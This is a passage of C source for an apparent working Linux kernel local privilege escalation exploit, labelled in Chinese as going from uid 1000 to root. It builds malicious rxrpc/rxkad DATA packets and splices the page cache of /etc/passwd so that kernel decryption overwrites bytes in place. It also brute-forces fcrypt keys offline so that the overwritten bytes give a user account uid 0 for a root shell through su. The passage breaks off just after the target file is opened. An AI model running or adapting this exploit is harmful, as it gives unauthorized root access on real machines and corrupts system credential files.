			LOG("client sendmsg returned EAGAIN (expected; kernel will keep "
					"retrying handshake)");
			return 0;
		}
		WARN("客户端 sendmsg 失败: %s", strerror(errno));
		return -1;
	}
	LOG("客户端已发送 %zd 字节 -> :%u (握手将异步进行)",
			n, srv_port);
	return 0;
}

/* =================================================================== */
/* fake-server (plain UDP)                                              */
/* =================================================================== */

static int setup_udp_server(uint16_t port)
{
	int s = socket(AF_INET, SOCK_DGRAM, 0);
	if (s < 0) { WARN("创建 UDP 假服务器失败: %s", strerror(errno)); return -1; }
	struct sockaddr_in sa = {0};
	sa.sin_family = AF_INET;
	sa.sin_port = htons(port);
	sa.sin_addr.s_addr = htonl(0x7F000001);
	if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) < 0) {
		WARN("UDP 假服务器绑定 :%u 失败: %s", port, strerror(errno));
		close(s); return -1;
	}
	LOG("UDP 假服务器已绑定 :%u", port);
	return s;
}

/* Receive one UDP datagram with timeout (ms). Returns bytes or -1. */
static ssize_t udp_recv_to(int s, void *buf, size_t cap,
		struct sockaddr_in *from, int timeout_ms)
{
	struct pollfd pfd = { .fd = s, .events = POLLIN };
	int rc = poll(&pfd, 1, timeout_ms);
	if (rc <= 0) return -1;
	socklen_t fl = from ? sizeof(*from) : 0;
	return recvfrom(s, buf, cap, 0,
			(struct sockaddr *)from, from ? &fl : NULL);
}

/* =================================================================== */
/* main PoC                                                             */
/* =================================================================== */

static int trigger_seq = 0;

static int do_one_trigger(int target_fd, off_t splice_off, size_t splice_len)
{
	char keyname[32];
	snprintf(keyname, sizeof(keyname), "evil%d", trigger_seq++);

	long key = add_rxrpc_key(keyname);
	if (key < 0) {
		if (trigger_seq < 5) WARN("注册 rxkad 密钥 %s 失败: %s", keyname, strerror(errno));
		return -1;
	}

	/* Use varying ports so kernel TIME_WAIT / stale state does not bite. */
	uint16_t port_S = 7777 + (trigger_seq * 2 % 200);
	uint16_t port_C = port_S + 1;
	uint16_t svc_id = 1234;

	int udp_srv = setup_udp_server(port_S);
	if (udp_srv < 0) {
		if (trigger_seq < 5) WARN("创建 UDP 假服务器(:%u) 失败", port_S);
		syscall(SYS_keyctl, 3 /*KEYCTL_INVALIDATE*/, key); return -1;
	}

	int rxsk_cli = setup_rxrpc_client(port_C, keyname);
	if (rxsk_cli < 0) {
		if (trigger_seq < 5) WARN("创建 rxrpc 客户端(:%u, %s) 失败", port_C, keyname);
		close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	if (rxrpc_client_initiate_call(rxsk_cli, port_S, svc_id, 0xDEAD) < 0) {
		if (trigger_seq < 5) WARN("发起 rxrpc call 失败");
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	uint8_t pkt[2048];
	struct sockaddr_in cli_addr;
	ssize_t n = udp_recv_to(udp_srv, pkt, sizeof(pkt), &cli_addr, 1500);
	if (n < (ssize_t)sizeof(struct rxrpc_wire_header)) {
		if (trigger_seq < 5) WARN("接收握手包失败: n=%zd errno=%s", n, strerror(errno));
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	struct rxrpc_wire_header *whdr_in = (struct rxrpc_wire_header *)pkt;
	uint32_t epoch  = ntohl(whdr_in->epoch);
	uint32_t cid    = ntohl(whdr_in->cid);
	uint32_t callN  = ntohl(whdr_in->callNumber);
	uint16_t svc_in = ntohs(whdr_in->serviceId);
	uint16_t cli_port = ntohs(cli_addr.sin_port);

	/* Send CHALLENGE */
	{
		struct {
			struct rxrpc_wire_header hdr;
			struct rxkad_challenge   ch;
		} __attribute__((packed)) c = {0};
		c.hdr.epoch = htonl(epoch);
		c.hdr.cid = htonl(cid);
		c.hdr.callNumber = 0; c.hdr.seq = 0;
		c.hdr.serial = htonl(0x10000);
		c.hdr.type = RXRPC_PACKET_TYPE_CHALLENGE;
		c.hdr.securityIndex = 2;
		c.hdr.serviceId = htons(svc_in);
		c.ch.version = htonl(2); c.ch.nonce = htonl(0xDEADBEEFu);
		c.ch.min_level = htonl(1);
		struct sockaddr_in to = { .sin_family=AF_INET, .sin_port=htons(cli_port),
			.sin_addr.s_addr=htonl(0x7F000001) };
		if (sendto(udp_srv, &c, sizeof(c), 0, (struct sockaddr*)&to, sizeof(to)) < 0) {
			close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
		}
	}

	/* Drain RESPONSE (best-effort) */
	for (int i = 0; i < 4; i++) {
		struct sockaddr_in src;
		if (udp_recv_to(udp_srv, pkt, sizeof(pkt), &src, 500) < 0) break;
	}

	/* csum + cksum with CURRENT SESSION_KEY */
	uint8_t csum_iv[8] = {0};
	if (compute_csum_iv(epoch, cid, 2, SESSION_KEY, csum_iv) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	uint16_t cksum_h = 0;
	if (compute_cksum(cid, callN, 1, SESSION_KEY, csum_iv, &cksum_h) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	/* Build malicious DATA header */
	struct rxrpc_wire_header mal = {0};
	mal.epoch = htonl(epoch);
	mal.cid = htonl(cid);
	mal.callNumber = htonl(callN);
	mal.seq = htonl(1);
	mal.serial = htonl(0x42000);
	mal.type = RXRPC_PACKET_TYPE_DATA;
	mal.flags = RXRPC_LAST_PACKET;
	mal.securityIndex = 2;
	mal.cksum = htons(cksum_h);
	mal.serviceId = htons(svc_in);

	/* connect udp_srv → client port for splice */
	struct sockaddr_in dst = { .sin_family=AF_INET, .sin_port=htons(cli_port),
		.sin_addr.s_addr=htonl(0x7F000001) };
	if (connect(udp_srv, (struct sockaddr*)&dst, sizeof(dst)) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}

	/* pipe + vmsplice header + splice file → pipe → udp_srv */
	int p[2];
	if (pipe(p) < 0) {
		close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key); return -1;
	}
	{
		struct iovec viv = { .iov_base = &mal, .iov_len = sizeof(mal) };
		if (vmsplice(p[1], &viv, 1, 0) < 0) goto trig_fail;
	}
	{
		loff_t off = splice_off;
		if (splice(target_fd, &off, p[1], NULL, splice_len, SPLICE_F_NONBLOCK) < 0)
			goto trig_fail;
	}
	if (splice(p[0], NULL, udp_srv, NULL, sizeof(mal) + splice_len, 0) < 0) {
		goto trig_fail;
	}
	close(p[0]); close(p[1]);

	/* recvmsg the malicious DATA into the kernel's verify_packet path */
	int fl = fcntl(rxsk_cli, F_GETFL);
	fcntl(rxsk_cli, F_SETFL, fl | O_NONBLOCK);
	for (int round = 0; round < 5; round++) {
		char rb[2048];
		struct sockaddr_rxrpc srx;
		char ccb[256];
		struct msghdr m = {0};
		struct iovec iv = { .iov_base = rb, .iov_len = sizeof(rb) };
		m.msg_name = &srx; m.msg_namelen = sizeof(srx);
		m.msg_iov = &iv;  m.msg_iovlen = 1;
		m.msg_control = ccb; m.msg_controllen = sizeof(ccb);
		ssize_t r = recvmsg(rxsk_cli, &m, 0);
		if (r > 0) break;
		if (errno == EAGAIN || errno == EWOULDBLOCK) usleep(20000);
		else break;
	}
	fcntl(rxsk_cli, F_SETFL, fl);

	close(rxsk_cli);
	close(udp_srv);
	syscall(SYS_keyctl, 3, key);
	return 0;

trig_fail:
	close(p[0]); close(p[1]);
	close(rxsk_cli); close(udp_srv); syscall(SYS_keyctl, 3, key);
	return -1;
}

/* ===================================================================
 * USER-SPACE pcbc(fcrypt) BRUTE-FORCE
 *
 * The kernel's rxkad_verify_packet_1() does an in-place 8-byte
 * pcbc(fcrypt) decrypt with iv=0 over the page-cache page at the splice
 * offset.  pcbc with single 8-B block and IV=0 reduces to a plain
 * fcrypt_decrypt(C, K).  We can therefore search for the right K
 * entirely in user-space — without touching the kernel/VM at all —
 * before applying ONE deterministic kernel trigger.
 *
 * Port of crypto/fcrypt.c from the kernel source (David Howells / KTH).
 * Verified against kernel test vectors:
 *   K=0,         decrypt(0E0900C73EF7ED41) = 00000000
 *   K=1144...66, decrypt(D8ED787477EC0680) = 123456789ABCDEF0
 * =================================================================== */

static const uint8_t fc_sbox0_raw[256] = {
	0xea, 0x7f, 0xb2, 0x64, 0x9d, 0xb0, 0xd9, 0x11, 0xcd, 0x86, 0x86, 0x91, 0x0a, 0xb2, 0x93, 0x06,
	0x0e, 0x06, 0xd2, 0x65, 0x73, 0xc5, 0x28, 0x60, 0xf2, 0x20, 0xb5, 0x38, 0x7e, 0xda, 0x9f, 0xe3,
	0xd2, 0xcf, 0xc4, 0x3c, 0x61, 0xff, 0x4a, 0x4a, 0x35, 0xac, 0xaa, 0x5f, 0x2b, 0xbb, 0xbc, 0x53,
	0x4e, 0x9d, 0x78, 0xa3, 0xdc, 0x09, 0x32, 0x10, 0xc6, 0x6f, 0x66, 0xd6, 0xab, 0xa9, 0xaf, 0xfd,
	0x3b, 0x95, 0xe8, 0x34, 0x9a, 0x81, 0x72, 0x80, 0x9c, 0xf3, 0xec, 0xda, 0x9f, 0x26, 0x76, 0x15,
	0x3e, 0x55, 0x4d, 0xde, 0x84, 0xee, 0xad, 0xc7, 0xf1, 0x6b, 0x3d, 0xd3, 0x04, 0x49, 0xaa, 0x24,
	0x0b, 0x8a, 0x83, 0xba, 0xfa, 0x85, 0xa0, 0xa8, 0xb1, 0xd4, 0x01, 0xd8, 0x70, 0x64, 0xf0, 0x51,
	0xd2, 0xc3, 0xa7, 0x75, 0x8c, 0xa5, 0x64, 0xef, 0x10, 0x4e, 0xb7, 0xc6, 0x61, 0x03, 0xeb, 0x44,
	0x3d, 0xe5, 0xb3, 0x5b, 0xae, 0xd5, 0xad, 0x1d, 0xfa, 0x5a, 0x1e, 0x33, 0xab, 0x93, 0xa2, 0xb7,
	0xe7, 0xa8, 0x45, 0xa4, 0xcd, 0x29, 0x63, 0x44, 0xb6, 0x69, 0x7e, 0x2e, 0x62, 0x03, 0xc8, 0xe0,
	0x17, 0xbb, 0xc7, 0xf3, 0x3f, 0x36, 0xba, 0x71, 0x8e, 0x97, 0x65, 0x60, 0x69, 0xb6, 0xf6, 0xe6,
	0x6e, 0xe0, 0x81, 0x59, 0xe8, 0xaf, 0xdd, 0x95, 0x22, 0x99, 0xfd, 0x63, 0x19, 0x74, 0x61, 0xb1,
	0xb6, 0x5b, 0xae, 0x54, 0xb3, 0x70, 0xff, 0xc6, 0x3b, 0x3e, 0xc1, 0xd7, 0xe1, 0x0e, 0x76, 0xe5,
	0x36, 0x4f, 0x59, 0xc7, 0x08, 0x6e, 0x82, 0xa6, 0x93, 0xc4, 0xaa, 0x26, 0x49, 0xe0, 0x21, 0x64,
	0x07, 0x9f, 0x64, 0x81, 0x9c, 0xbf, 0xf9, 0xd1, 0x43, 0xf8, 0xb6, 0xb9, 0xf1, 0x24, 0x75, 0x03,
	0xe4, 0xb0, 0x99, 0x46, 0x3d, 0xf5, 0xd1, 0x39, 0x72, 0x12, 0xf6, 0xba, 0x0c, 0x0d, 0x42, 0x2e,
};
static const uint8_t fc_sbox1_raw[256] = {
	0x77, 0x14, 0xa6, 0xfe, 0xb2, 0x5e, 0x8c, 0x3e, 0x67, 0x6c, 0xa1, 0x0d, 0xc2, 0xa2, 0xc1, 0x85,
	0x6c, 0x7b, 0x67, 0xc6, 0x23, 0xe3, 0xf2, 0x89, 0x50, 0x9c, 0x03, 0xb7, 0x73, 0xe6, 0xe1, 0x39,
	0x31, 0x2c, 0x27, 0x9f, 0xa5, 0x69, 0x44, 0xd6, 0x23, 0x83, 0x98, 0x7d, 0x3c, 0xb4, 0x2d, 0x99,
	0x1c, 0x1f, 0x8c, 0x20, 0x03, 0x7c, 0x5f, 0xad, 0xf4, 0xfa, 0x95, 0xca, 0x76, 0x44, 0xcd, 0xb6,
	0xb8, 0xa1, 0xa1, 0xbe, 0x9e, 0x54, 0x8f, 0x0b, 0x16, 0x74, 0x31, 0x8a, 0x23, 0x17, 0x04, 0xfa,
	0x79, 0x84, 0xb1, 0xf5, 0x13, 0xab, 0xb5, 0x2e, 0xaa, 0x0c, 0x60, 0x6b, 0x5b, 0xc4, 0x4b, 0xbc,
	0xe2, 0xaf, 0x45, 0x73, 0xfa, 0xc9, 0x49, 0xcd, 0x00, 0x92, 0x7d, 0x97, 0x7a, 0x18, 0x60, 0x3d,
	0xcf, 0x5b, 0xde, 0xc6, 0xe2, 0xe6, 0xbb, 0x8b, 0x06, 0xda, 0x08, 0x15, 0x1b, 0x88, 0x6a, 0x17,
	0x89, 0xd0, 0xa9, 0xc1, 0xc9, 0x70, 0x6b, 0xe5, 0x43, 0xf4, 0x68, 0xc8, 0xd3, 0x84, 0x28, 0x0a,
	0x52, 0x66, 0xa3, 0xca, 0xf2, 0xe3, 0x7f, 0x7a, 0x31, 0xf7, 0x88, 0x94, 0x5e, 0x9c, 0x63, 0xd5,
	0x24, 0x66, 0xfc, 0xb3, 0x57, 0x25, 0xbe, 0x89, 0x44, 0xc4, 0xe0, 0x8f, 0x23, 0x3c, 0x12, 0x52,
	0xf5, 0x1e, 0xf4, 0xcb, 0x18, 0x33, 0x1f, 0xf8, 0x69, 0x10, 0x9d, 0xd3, 0xf7, 0x28, 0xf8, 0x30,
	0x05, 0x5e, 0x32, 0xc0, 0xd5, 0x19, 0xbd, 0x45, 0x8b, 0x5b, 0xfd, 0xbc, 0xe2, 0x5c, 0xa9, 0x96,
	0xef, 0x70, 0xcf, 0xc2, 0x2a, 0xb3, 0x61, 0xad, 0x80, 0x48, 0x81, 0xb7, 0x1d, 0x43, 0xd9, 0xd7,
	0x45, 0xf0, 0xd8, 0x8a, 0x59, 0x7c, 0x57, 0xc1, 0x79, 0xc7, 0x34, 0xd6, 0x43, 0xdf, 0xe4, 0x78,
	0x16, 0x06, 0xda, 0x92, 0x76, 0x51, 0xe1, 0xd4, 0x70, 0x03, 0xe0, 0x2f, 0x96, 0x91, 0x82, 0x80,
};
static const uint8_t fc_sbox2_raw[256] = {
	0xf0, 0x37, 0x24, 0x53, 0x2a, 0x03, 0x83, 0x86, 0xd1, 0xec, 0x50, 0xf0, 0x42, 0x78, 0x2f, 0x6d,
	0xbf, 0x80, 0x87, 0x27, 0x95, 0xe2, 0xc5, 0x5d, 0xf9, 0x6f, 0xdb, 0xb4, 0x65, 0x6e, 0xe7, 0x24,
	0xc8, 0x1a, 0xbb, 0x49, 0xb5, 0x0a, 0x7d, 0xb9, 0xe8, 0xdc, 0xb7, 0xd9, 0x45, 0x20, 0x1b, 0xce,
	0x59, 0x9d, 0x6b, 0xbd, 0x0e, 0x8f, 0xa3, 0xa9, 0xbc, 0x74, 0xa6, 0xf6, 0x7f, 0x5f, 0xb1, 0x68,
	0x84, 0xbc, 0xa9, 0xfd, 0x55, 0x50, 0xe9, 0xb6, 0x13, 0x5e, 0x07, 0xb8, 0x95, 0x02, 0xc0, 0xd0,
	0x6a, 0x1a, 0x85, 0xbd, 0xb6, 0xfd, 0xfe, 0x17, 0x3f, 0x09, 0xa3, 0x8d, 0xfb, 0xed, 0xda, 0x1d,
	0x6d, 0x1c, 0x6c, 0x01, 0x5a, 0xe5, 0x71, 0x3e, 0x8b, 0x6b, 0xbe, 0x29, 0xeb, 0x12, 0x19, 0x34,
	0xcd, 0xb3, 0xbd, 0x35, 0xea, 0x4b, 0xd5, 0xae, 0x2a, 0x79, 0x5a, 0xa5, 0x32, 0x12, 0x7b, 0xdc,
	0x2c, 0xd0, 0x22, 0x4b, 0xb1, 0x85, 0x59, 0x80, 0xc0, 0x30, 0x9f, 0x73, 0xd3, 0x14, 0x48, 0x40,
	0x07, 0x2d, 0x8f, 0x80, 0x0f, 0xce, 0x0b, 0x5e, 0xb7, 0x5e, 0xac, 0x24, 0x94, 0x4a, 0x18, 0x15,
	0x05, 0xe8, 0x02, 0x77, 0xa9, 0xc7, 0x40, 0x45, 0x89, 0xd1, 0xea, 0xde, 0x0c, 0x79, 0x2a, 0x99,
	0x6c, 0x3e, 0x95, 0xdd, 0x8c, 0x7d, 0xad, 0x6f, 0xdc, 0xff, 0xfd, 0x62, 0x47, 0xb3, 0x21, 0x8a,
	0xec, 0x8e, 0x19, 0x18, 0xb4, 0x6e, 0x3d, 0xfd, 0x74, 0x54, 0x1e, 0x04, 0x85, 0xd8, 0xbc, 0x1f,
	0x56, 0xe7, 0x3a, 0x56, 0x67, 0xd6, 0xc8, 0xa5, 0xf3, 0x8e, 0xde, 0xae, 0x37, 0x49, 0xb7, 0xfa,
	0xc8, 0xf4, 0x1f, 0xe0, 0x2a, 0x9b, 0x15, 0xd1, 0x34, 0x0e, 0xb5, 0xe0, 0x44, 0x78, 0x84, 0x59,
	0x56, 0x68, 0x77, 0xa5, 0x14, 0x06, 0xf5, 0x2f, 0x8c, 0x8a, 0x73, 0x80, 0x76, 0xb4, 0x10, 0x86,
};
static const uint8_t fc_sbox3_raw[256] = {
	0xa9, 0x2a, 0x48, 0x51, 0x84, 0x7e, 0x49, 0xe2, 0xb5, 0xb7, 0x42, 0x33, 0x7d, 0x5d, 0xa6, 0x12,
	0x44, 0x48, 0x6d, 0x28, 0xaa, 0x20, 0x6d, 0x57, 0xd6, 0x6b, 0x5d, 0x72, 0xf0, 0x92, 0x5a, 0x1b,
	0x53, 0x80, 0x24, 0x70, 0x9a, 0xcc, 0xa7, 0x66, 0xa1, 0x01, 0xa5, 0x41, 0x97, 0x41, 0x31, 0x82,
	0xf1, 0x14, 0xcf, 0x53, 0x0d, 0xa0, 0x10, 0xcc, 0x2a, 0x7d, 0xd2, 0xbf, 0x4b, 0x1a, 0xdb, 0x16,
	0x47, 0xf6, 0x51, 0x36, 0xed, 0xf3, 0xb9, 0x1a, 0xa7, 0xdf, 0x29, 0x43, 0x01, 0x54, 0x70, 0xa4,
	0xbf, 0xd4, 0x0b, 0x53, 0x44, 0x60, 0x9e, 0x23, 0xa1, 0x18, 0x68, 0x4f, 0xf0, 0x2f, 0x82, 0xc2,
	0x2a, 0x41, 0xb2, 0x42, 0x0c, 0xed, 0x0c, 0x1d, 0x13, 0x3a, 0x3c, 0x6e, 0x35, 0xdc, 0x60, 0x65,
	0x85, 0xe9, 0x64, 0x02, 0x9a, 0x3f, 0x9f, 0x87, 0x96, 0xdf, 0xbe, 0xf2, 0xcb, 0xe5, 0x6c, 0xd4,
	0x5a, 0x83, 0xbf, 0x92, 0x1b, 0x94, 0x00, 0x42, 0xcf, 0x4b, 0x00, 0x75, 0xba, 0x8f, 0x76, 0x5f,
	0x5d, 0x3a, 0x4d, 0x09, 0x12, 0x08, 0x38, 0x95, 0x17, 0xe4, 0x01, 0x1d, 0x4c, 0xa9, 0xcc, 0x85,
	0x82, 0x4c, 0x9d, 0x2f, 0x3b, 0x66, 0xa1, 0x34, 0x10, 0xcd, 0x59, 0x89, 0xa5, 0x31, 0xcf, 0x05,
	0xc8, 0x84, 0xfa, 0xc7, 0xba, 0x4e, 0x8b, 0x1a, 0x19, 0xf1, 0xa1, 0x3b, 0x18, 0x12, 0x17, 0xb0,
	0x98, 0x8d, 0x0b, 0x23, 0xc3, 0x3a, 0x2d, 0x20, 0xdf, 0x13, 0xa0, 0xa8, 0x4c, 0x0d, 0x6c, 0x2f,
	0x47, 0x13, 0x13, 0x52, 0x1f, 0x2d, 0xf5, 0x79, 0x3d, 0xa2, 0x54, 0xbd, 0x69, 0xc8, 0x6b, 0xf3,
	0x05, 0x28, 0xf1, 0x16, 0x46, 0x40, 0xb0, 0x11, 0xd3, 0xb7, 0x95, 0x49, 0xcf, 0xc3, 0x1d, 0x8f,
	0xd8, 0xe1, 0x73, 0xdb, 0xad, 0xc8, 0xc9, 0xa9, 0xa1, 0xc2, 0xc5, 0xe3, 0xba, 0xfc, 0x0e, 0x25,
};

static uint32_t fc_sbox0[256], fc_sbox1[256], fc_sbox2[256], fc_sbox3[256];

#include <endian.h>

static void fcrypt_init_sboxes(void)
{
	for (int i = 0; i < 256; i++) {
		fc_sbox0[i] = htobe32((uint32_t)fc_sbox0_raw[i] << 3);
		fc_sbox1[i] = htobe32(((uint32_t)(fc_sbox1_raw[i] & 0x1f) << 27) |
				((uint32_t)fc_sbox1_raw[i] >> 5));
		fc_sbox2[i] = htobe32((uint32_t)fc_sbox2_raw[i] << 11);
		fc_sbox3[i] = htobe32((uint32_t)fc_sbox3_raw[i] << 19);
	}
}

#define fc_ror56_64(k, n) \
	(k = (k >> (n)) | ((k & ((1ULL << (n)) - 1)) << (56 - (n))))

typedef struct { uint32_t sched[16]; } fcrypt_uctx;

static void fcrypt_user_setkey(fcrypt_uctx *ctx, const uint8_t key[8])
{
	uint64_t k = 0;
	k  = (uint64_t)(key[0] >> 1);
	k <<= 7; k |= (uint64_t)(key[1] >> 1);
	k <<= 7; k |= (uint64_t)(key[2] >> 1);
	k <<= 7; k |= (uint64_t)(key[3] >> 1);
	k <<= 7; k |= (uint64_t)(key[4] >> 1);
	k <<= 7; k |= (uint64_t)(key[5] >> 1);
	k <<= 7; k |= (uint64_t)(key[6] >> 1);
	k <<= 7; k |= (uint64_t)(key[7] >> 1);

	ctx->sched[0x0] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x1] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x2] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x3] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x4] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x5] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x6] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x7] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x8] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0x9] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xa] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xb] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xc] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xd] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xe] = htobe32((uint32_t)k); fc_ror56_64(k, 11);
	ctx->sched[0xf] = htobe32((uint32_t)k);
}

#define FC_F(R_, L_, sched_) do {                                        \
	union { uint32_t l; uint8_t c[4]; } u;                               \
	u.l = (sched_) ^ (R_);                                               \
	L_ ^= fc_sbox0[u.c[0]] ^ fc_sbox1[u.c[1]] ^                          \
	fc_sbox2[u.c[2]] ^ fc_sbox3[u.c[3]];                           \
} while (0)

static void fcrypt_user_decrypt(const fcrypt_uctx *ctx,
		uint8_t out[8], const uint8_t in[8])
{
	uint32_t L, R;
	memcpy(&L, in, 4);
	memcpy(&R, in + 4, 4);
	FC_F(L, R, ctx->sched[0xf]);
	FC_F(R, L, ctx->sched[0xe]);
	FC_F(L, R, ctx->sched[0xd]);
	FC_F(R, L, ctx->sched[0xc]);
	FC_F(L, R, ctx->sched[0xb]);
	FC_F(R, L, ctx->sched[0xa]);
	FC_F(L, R, ctx->sched[0x9]);
	FC_F(R, L, ctx->sched[0x8]);
	FC_F(L, R, ctx->sched[0x7]);
	FC_F(R, L, ctx->sched[0x6]);
	FC_F(L, R, ctx->sched[0x5]);
	FC_F(R, L, ctx->sched[0x4]);
	FC_F(L, R, ctx->sched[0x3]);
	FC_F(R, L, ctx->sched[0x2]);
	FC_F(L, R, ctx->sched[0x1]);
	FC_F(R, L, ctx->sched[0x0]);
	memcpy(out, &L, 4);
	memcpy(out + 4, &R, 4);
}

/* For the 2-splice chain we want the line to have EXACTLY 6 ':' and a
 * shell field that equals "/bin/bash" (in /etc/shells, valid path).
 * The two splices interlock as:
 *
 *   bytes 7..14  (offset 2800): P1 — sets uid=0, gid=1 digit, then
 *                4 random gecos-prefix bytes.
 *   bytes 15..22 (offset 2808): P2 — wipes the original ':' at line
 *                pos 16, preserves ':' at pos 21 and '/' at pos 22.
 *
 *   Combined line: "test:x:0:G:GGGGGGGGGG:/home/test:/bin/bash"
 *                   pos 0    8    21       32
 *
 *   pw_uid=0, pw_gid=G, pw_dir="/home/test", pw_shell="/bin/bash".
 *   Now `su -s /bin/bash test` proceeds through the restricted_shell()
 *   check (because /bin/bash IS in /etc/shells) and exec()s /bin/bash
 *   under uid=0.
 *
 * === 3-splice predicates ===
 *
 * After applying splices A, B, C in order to /etc/passwd line 1
 * (offsets 4, 6, 8 — each 8 bytes, last-write-wins), the final state
 * of chars 4..15 is determined by these P bytes:
 *
 *   char 4  = P_A[0]   want: ':'
 *   char 5  = P_A[1]   want: ':'
 *   char 6  = P_B[0]   want: '0'   (overwrites P_A[2])
 *   char 7  = P_B[1]   want: ':'   (overwrites P_A[3])
 *   char 8  = P_C[0]   want: '0'   (overwrites P_A[4]/P_B[2])
 *   char 9  = P_C[1]   want: ':'   (overwrites P_A[5]/P_B[3])
 *   char 10..14 = P_C[2..6]  want: any byte except ':' '\0' '\n'
 *   char 15 = P_C[7]   want: ':'
 *
 * The constraints on P_A[2..7] and P_B[2..7] are vacuous because they
 * are overwritten before /etc/passwd is read by anyone — we only care
 * about the final state. */
static inline int fc_check_pa_nullok(const uint8_t P[8])
{
	return P[0] == ':' && P[1] == ':';
}

static inline int fc_check_pb_nullok(const uint8_t P[8])
{
	return P[0] == '0' && P[1] == ':';
}

static inline int fc_check_pc_nullok(const uint8_t P[8])
{
	if (P[0] != '0') return 0;
	if (P[1] != ':') return 0;
	if (P[7] != ':') return 0;
	for (int i = 2; i < 7; i++) {
		if (P[i] == ':' || P[i] == '\0' || P[i] == '\n') return 0;
	}
	return 1;
}

static uint64_t fc_splitmix64(uint64_t *s)
{
	uint64_t z = (*s += 0x9E3779B97F4A7C15ULL);
	z = (z ^ (z >> 30)) * 0xBF58476D1CE4E5B9ULL;
	z = (z ^ (z >> 27)) * 0x94D049BB133111EBULL;
	return z ^ (z >> 31);
}

/* Generic brute-force.  `predicate` decides if a P is acceptable. */
typedef int (*pcheck_fn)(const uint8_t P[8]);

static int find_K_offline_generic(const uint8_t C[8], uint64_t max_iters,
		pcheck_fn check,
		uint8_t K_out[8], uint8_t P_out[8],
		uint64_t seed_init,
		const char *label)
{
	fcrypt_uctx ctx;
	uint8_t K[8], P[8];
	uint64_t seed = seed_init;
	struct timespec ts0, ts1;
	clock_gettime(CLOCK_MONOTONIC, &ts0);

	for (uint64_t iter = 0; iter < max_iters; iter++) {
		uint64_t r = fc_splitmix64(&seed);
		memcpy(K, &r, 8);
		fcrypt_user_setkey(&ctx, K);
		fcrypt_user_decrypt(&ctx, P, C);

		if (check(P)) {
			memcpy(K_out, K, 8);
			memcpy(P_out, P, 8);
			clock_gettime(CLOCK_MONOTONIC, &ts1);
			double dt = (ts1.tv_sec - ts0.tv_sec) +
				(ts1.tv_nsec - ts0.tv_nsec) / 1e9;
			LOG("%s found after %lu iters in %.2fs (%.2fM/s) K=%02x%02x%02x%02x%02x%02x%02x%02x  P=%02x%02x%02x%02x%02x%02x%02x%02x \"%c%c%c%c%c%c%c%c\"",
					label,
					(unsigned long)iter, dt, iter / dt / 1e6,
					K[0],K[1],K[2],K[3],K[4],K[5],K[6],K[7],
					P[0],P[1],P[2],P[3],P[4],P[5],P[6],P[7],
					(P[0]>=32&&P[0]<127)?P[0]:'.',
					(P[1]>=32&&P[1]<127)?P[1]:'.',
					(P[2]>=32&&P[2]<127)?P[2]:'.',
					(P[3]>=32&&P[3]<127)?P[3]:'.',
					(P[4]>=32&&P[4]<127)?P[4]:'.',
					(P[5]>=32&&P[5]<127)?P[5]:'.',
					(P[6]>=32&&P[6]<127)?P[6]:'.',
					(P[7]>=32&&P[7]<127)?P[7]:'.');
			return 0;
		}

		if (g_verbose && (iter & 0x3ffffff) == 0 && iter > 0) {
			clock_gettime(CLOCK_MONOTONIC, &ts1);
			double dt = (ts1.tv_sec - ts0.tv_sec) +
				(ts1.tv_nsec - ts0.tv_nsec) / 1e9;
			fprintf(stderr, "  [%s %.1fs] iter=%lu (%.2fM/s)\n",
					label, dt, (unsigned long)iter, iter / dt / 1e6);
		}
	}
	return -1;
}


int rxrpc_lpe_main(int argc, char **argv)
{
	fprintf(stderr, "\n=== rxrpc/rxkad 本地提权 (uid=1000 -> root) ===\n");
	fprintf(stderr, "[*] uid=%u euid=%u gid=%u\n",
			getuid(), geteuid(), getgid());

	{
		const char *no_unshare = getenv("POC_NO_UNSHARE");
		if (!no_unshare || *no_unshare != '1') {
			const char *do_unshare = getenv("POC_UNSHARE");
			if (do_unshare && *do_unshare == '1') {
				if (do_unshare_userns_netns() < 0) return 1;
			}
		}
	}

	/* Open a dummy AF_RXRPC socket to autoload the rxrpc kernel module.
	 * Without this, the first add_key("rxrpc", ...) call fails with ENODEV
	 * because the kernel key type "rxrpc" is registered by rxrpc_init() in
	 * the module load path. */
	{
		int dummy = socket(AF_RXRPC, SOCK_DGRAM, PF_INET);
		if (dummy < 0) {
			WARN("socket(AF_RXRPC) 失败: %s — 模块无法加载?", strerror(errno));
			return 1;
		}
		close(dummy);
		LOG("rxrpc 模块已通过 socket(AF_RXRPC) 自动加载");
	}

	/* Open /etc/passwd RO and mmap the first page (which contains the
	 * root entry on line 1). */
	const char *target_path = getenv("POC_TARGET_FILE");
	if (!target_path || !*target_path) target_path = "/etc/passwd";

	int rfd_ro = open(target_path, O_RDONLY);
	if (rfd_ro < 0) {
		WARN("以只读打开 %s 失败: %s", target_path, strerror(errno));
		return 1;
	}
	struct stat st;
	fstat(rfd_ro, &st);
	if (st.st_size < 32) { WARN("目标文件太小: %lld", (long long)st.st_size); return 1; }
